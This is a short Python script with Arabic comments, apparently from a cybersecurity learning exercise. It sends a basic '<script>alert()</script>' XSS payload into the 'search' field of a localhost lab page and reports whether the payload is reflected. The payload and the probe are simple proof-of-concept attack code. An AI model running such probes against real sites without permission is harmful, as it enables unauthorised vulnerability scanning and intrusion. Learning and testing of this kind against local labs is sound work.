# هجمة xss:

import requests

url = "http://localhost/pycyber1/xss.php"
code = '<script>alert("XSS FOUND");</script>'
data = {
    "search": code, #حقن حقل الادخال search بالكود
    }
response = requests.post(url,data)

if code in response.text:
    print(f"[+] XSS Found : {url} | {code}")
else:
    print(f"[-] XSS Not Found : {url}")
